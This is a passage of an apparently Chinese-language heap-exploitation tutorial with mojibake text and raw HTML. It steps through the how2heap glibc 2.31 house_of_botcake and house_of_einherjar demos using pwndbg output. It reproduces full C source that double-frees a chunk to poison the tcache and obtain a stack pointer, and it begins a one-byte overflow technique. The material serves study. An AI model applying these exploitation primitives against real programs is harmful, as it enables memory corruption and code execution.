class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬free a å† free prev ï¼Œ ç”±äº prev ä¸  a æ˜¯ç›¸é‚» chunk ï¼Œæ‰€ä»¥ä¼šè§¦å‘åˆå¹¶ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">50</span>     &#125;</span><br><span class="line">   <span class="number">51</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">   <span class="number">52</span>     <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"> â–º <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br></pre></td></tr></table></figure><p>è§¦å‘åˆå¹¶åï¼Œåœ¨ unsortedbin é‡Œçš„æ˜¯ prev chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x555555559a00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x555555559a00</span></span><br><span class="line"><span class="number">0x555555559a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000221</span>      ====== &gt; chunk prev</span><br><span class="line"><span class="number">0x555555559a10</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559aa0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ac0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559af0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span>        ====== &gt; chunk a</span><br><span class="line"><span class="number">0x555555559b20</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559b30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¦æƒ³åŠæ³•æŠŠ chunk a æ”¾å…¥ tcache  biné‡Œï¼Œç”±äºæ­¤æ—¶ tcache bins æ˜¯æ»¡çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆå–ä¸€ä¸ªå‡ºæ¥, ç„¶åå† free ä¸€æ¬¡ a</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">   <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br><span class="line">   <span class="number">57</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line"> â–º <span class="number">58</span>     <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="number">59</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">60</span>     <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">   <span class="number">61</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>     <span class="comment">// simple tcache poisoning</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ a chunk å°±ä¼šè¢«æ”¾å…¥ tcahcebins é‡Œï¼ŒåŒæ—¶ prev å¯ä»¥æ§åˆ¶  chunk a çš„å†…å®¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> â€”â–¸ <span class="number">0x5555555597f0</span> â€”â–¸ <span class="number">0x5555555596e0</span> â€”â–¸ <span class="number">0x5555555595d0</span> â€”â–¸ <span class="number">0x5555555594c0</span> â€”â–¸ <span class="number">0x5555555593b0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x555555559a00</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x555555559b20</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ä»æ­¤æ—¶çš„ unsortedbin ç»™ä»–åˆ†ä¸€å—å‡ºæ¥ï¼Œç„¶åä¿®æ”¹å…¶ fd çš„å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">64</span>     <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">  <span class="number">65</span>     <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">  <span class="number">66</span>     <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">â–º <span class="number">67</span>     <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">  <span class="number">68</span>     b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">69</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±æˆåŠŸæ±¡æŸ“äº† tachebin çš„å†…å®¹ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> â€”â–¸ <span class="number">0x7fffffffe260</span> â€”â–¸ <span class="number">0x555555554040</span> â—‚â€” <span class="number">0x400000006</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559b30</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x555555559b30</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥ç€åªéœ€è¦ä¸¤æ¬¡ malloc å°±èƒ½æ‹¿åˆ° 0x7fffffffe260 è¿™ä¸ªåœ°å€</p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h3><p>è¿™é‡Œå±•ç¤ºçš„æ˜¯é€šè¿‡ä¸€å­—èŠ‚æº¢å‡ºï¼Œå–åˆ°ä»»æ„åœ°å€çš„æŠ€æœ¯</p><p>é¦–å…ˆï¼Œåœ¨å †ä¸Šä¼ªé€ ä¸€ä¸ª chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">35</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">36</span>     <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">   <span class="number">37</span></span><br><span class="line">   <span class="number">38</span>     <span class="comment">// create a fake chunk</span></span><br><span class="line">   <span class="number">39</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line"> â–º <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">   <span class="number">41</span></span><br><span class="line">   <span class="number">42</span>     a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">   <span class="number">43</span>     a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">   <span class="number">44</span>     a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">   <span class="number">45</span>     a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p>è¯¥ fake chunkç»“æ„å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; malloc_chunk -f &amp;a[<span class="number">0</span>]</span><br><span class="line">Fake chunk | Allocated chunk</span><br><span class="line">Addr: <span class="number">0x5555555592a0</span></span><br><span class="line">prev_size: <span class="number">0x00</span></span><br><span class="line">size: <span class="number">0x60</span></span><br><span class="line">fd: <span class="number">0x5555555592a0</span></span><br><span class="line">bk: <span class="number">0x5555555592a0</span></span><br><span class="line">fd_nextsize: <span class="number">0x00</span></span><br><span class="line">bk_nextsize: <span class="number">0x00</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åœ¨å †ä¸Šå¸ƒå±€ä¸¤ä¸ª chunk åˆ†åˆ«ä¸º b å’Œ c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæ­¤æ—¶å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª ä¸€å­—èŠ‚æº¢å‡º,kå¯ä»¥è¦†ç›–åˆ°, c chunk çš„size ä½ç½®ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">71</span>     <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">74</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> â–º <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">77</span>     b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">   <span class="number">78</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>     <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="number">81</span>            <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span 